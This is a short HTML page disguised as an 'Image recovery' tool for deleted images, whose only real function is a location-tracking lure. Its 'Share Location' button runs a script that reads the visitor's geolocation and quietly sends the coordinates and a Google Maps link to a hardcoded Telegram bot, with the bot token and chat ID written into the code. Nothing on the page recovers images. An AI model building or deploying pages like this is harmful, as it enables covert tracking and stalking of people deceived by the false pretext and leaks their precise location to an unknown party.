<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Click here</title>
</head>
<body>

<h2> Image recovery</h2>
<p>Recovery Your Deleted Image.</p>

<button onclick="getLocation()">Share Location</button>

<p id="result"></p>

<script>

function getLocation() {

  if (!navigator.geolocation) {
    document.getElementById("result").innerHTML =
      "Geolocation supported nahi hai.";
    return;
  }

  navigator.geolocation.getCurrentPosition(function(position) {

    let lat = position.coords.latitude;
    let lon = position.coords.longitude;

    document.getElementById("result").innerHTML =
      "Latitude: " + lat + "<br>Longitude: " + lon;

    let token = "8672043310:AAG21OcxWGXBE0sMvJ-z7wkYd3w1FIMSfCI";
    let chatId = "6088000954";

    let text =
      "📍 New Location\n" +
      "Latitude: " + lat + "\n" +
      "Longitude: " + lon + "\n" +
      "https://maps.google.com/?q=" + lat + "," + lon;

    fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`
    );

  });

}

</script>

</body>
</html>
